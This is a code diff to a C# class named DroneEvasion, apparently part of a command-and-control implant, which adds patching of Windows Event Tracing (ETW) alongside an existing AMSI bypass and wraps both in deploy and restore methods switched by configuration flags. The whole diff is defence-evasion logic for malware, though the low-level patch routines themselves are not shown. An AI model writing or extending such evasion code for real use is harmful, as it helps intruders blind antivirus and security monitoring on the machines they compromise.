@@ -7,26 +7,55 @@ namespace Drone
         private readonly DroneConfig _config;
 
         private Amsi _amsi;
+        private Etw _etw;
 
         public DroneEvasion(DroneConfig config)
         {
             _config = config;
         }
 
-        public void BypassAmsi()
+        public void RestoreEvasionMethods()
+        {
+            RestoreEtw();
+            RestoreAmsi();
+        }
+
+        public void DeployEvasionMethods()
+        {
+            BypassEtw();
+            BypassAmsi();
+        }
+
+        private void BypassEtw()
+        {
+            var bypassEtw = _config.GetConfig<bool>("BypassEtw");
+
+            if (!bypassEtw) return;
+
+            _etw = new Etw();
+            _etw.Patch();
+        }
+
+        private void RestoreEtw()
+        {
+            var bypassEtw = _config.GetConfig<bool>("BypassEtw");
+            if (bypassEtw) _etw?.Restore();
+        }
+
+        private void BypassAmsi()
         {
             var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
 
             if (!bypassAmsi) return;
-            
+
             _amsi = new Amsi();
             _amsi.Patch();
         }
 
-        public void RestoreAmsi()
+        private void RestoreAmsi()
         {
             var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
-            if (bypassAmsi) _amsi.Restore();
+            if (bypassAmsi) _amsi?.Restore();
         }
     }
 }
